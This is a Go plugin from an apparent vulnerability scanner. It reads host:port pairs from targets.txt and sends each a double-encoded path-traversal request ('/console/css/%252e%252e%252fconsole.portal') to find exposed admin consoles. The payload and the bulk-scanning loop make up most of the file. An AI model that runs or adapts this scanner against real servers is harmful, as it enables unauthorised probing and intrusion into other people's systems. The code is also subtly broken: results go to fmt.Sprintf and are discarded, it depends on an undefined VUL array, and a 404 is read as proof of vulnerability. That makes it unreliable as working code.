package Plugins

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

func poc14882(host string, port int) bool {
	targetURL := fmt.Sprintf("http://%s:%d/console/css/%s", host, port, "%252e%252e%252fconsole.portal")

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	resp, err := client.Get(targetURL)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// 检查HTTP响应码是否为404
	if resp.StatusCode == http.StatusNotFound {
		return true
	}

	return false
}

func Check14882() {
	filePath := "targets.txt"

	file, err := os.Open(filePath)
	if err != nil {
		fmt.Printf("无法打开文件：%s\n", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			parts := strings.Split(line, ":")
			if len(parts) != 2 {
				fmt.Printf("无效的目标格式：%s\n", line)
				continue
			}

			targetHost := parts[0]
			targetPort := parts[1]

			// 将端口转换为整数
			var portInt int
			_, err := fmt.Sscanf(targetPort, "%d", &portInt)
			if err != nil {
				fmt.Printf("无效的端口：%s\n", targetPort)
				continue
			}

			if poc14882(targetHost, portInt) {
				fmt.Sprintf("[-] 存在漏洞 %s", VUL[11])
			} else {
				fmt.Sprintf("[-] 已扫描 %s", VUL[11])
			}
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("读取文件时发生错误：%s\n", err)
	}
}
